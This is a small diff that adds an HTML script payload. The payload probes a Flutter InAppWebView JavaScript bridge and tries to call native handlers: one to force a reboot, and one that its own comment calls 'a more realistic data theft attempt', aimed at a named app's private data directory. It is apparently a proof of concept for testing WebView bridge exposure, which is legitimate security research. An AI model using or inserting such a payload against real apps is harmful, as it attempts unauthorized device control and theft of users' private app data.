@@ -1,0 +1,13 @@
+<script>
+  try {
+    // Attempting to access the Flutter-specific bridge
+    if (window.flutter_inappwebview) {
+        // We try to call 'postMessage' with a payload that mimics a system command
+        window.flutter_inappwebview.callHandler('reboot', 'force'); 
+        // Or a more realistic data theft attempt:
+        window.flutter_inappwebview.callHandler('getStoragePath', '/data/user/0/com.wisdomtree.wtprime/');
+    }
+  } catch (e) {
+    console.log("Bridge access failed: " + e.message);
+  }
+</script>
